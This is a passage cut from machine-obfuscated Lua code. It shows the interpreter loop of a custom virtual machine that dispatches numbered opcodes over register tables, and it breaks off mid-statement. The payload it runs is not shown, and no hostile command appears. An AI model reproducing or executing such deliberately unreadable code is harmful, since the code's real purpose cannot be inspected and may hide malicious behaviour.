h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g>62 then c[a[2]]=c[a[3]]-a[4];else local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];b=a[3];end;elseif g<=74 then if g<=68 then if g<=65 then if g==64 then local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];else local a=a[2]local d,b=i(c[a](f(c,a+1,h)))h=b+a-1 local b=0;for a=a,h do b=b+1;c[a]=d[b];end;end;elseif g<=66 then local k;local l,m;local j;local g;c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,m=i(c[g](f(c,g+1,a[3])))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];elseif g==67 then local b=a[2];local d=c[b];for a=b+1,a[3]do m(d,c[a])end;else c[a[2]]=n(o[a[3]],nil,e);end;elseif g<=71 then if g<=69 then local h;local i;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]i={c[g](f(c,g+1,a[3]))};h=0;for a=g,a[4]do h=h+1;c[a]=i[h];end b=b+1;a=d[b];if c[a[2]]then b=b+1;else b=a[3];end;elseif g>70 then local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=72 then local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g>73 then local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=79 then if g<=76 then if g==75 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];else local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=77 then local k;local l,m;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))elseif g>78 then local h;local g;c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];b=a[3];else local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=82 then if g<=80 then c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];elseif g==81 then c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];else c[a[2]][c[a[3]]]=c[a[4]];end;elseif g<=83 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];elseif g==84 then c[a[2]]=c[a[3]]*c[a[4]];else local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];end;elseif g<=128 then if g<=106 then if g<=95 then if g<=90 then if g<=87 then if g==86 then c[a[2]][a[3]]=a[4];else local g;local j;local l,m;local k;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]l={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=l[j];end b=b+1;a=d[b];b=a[3];end;elseif g<=88 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];elseif g==89 then local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=92 then if g==91 then local g;local j;local k,m;local l;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];l=c[a[3]];c[g+1]=l;c[g]=l[a[4]];b=b+1;a=d[b];g=a[2]k,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]k={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=k[j];end b=b+1;a=d[b];b=a[3];else local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=93 then local k;local m,l;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]m,l=i(c[g](c[g+1]))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))elseif g==94 then local a=a[2]c[a](c[a+1])else c[a[2]]=k[a[3]];end;elseif g<=100 then if g<=97 then if g>96 then local g;local h;local 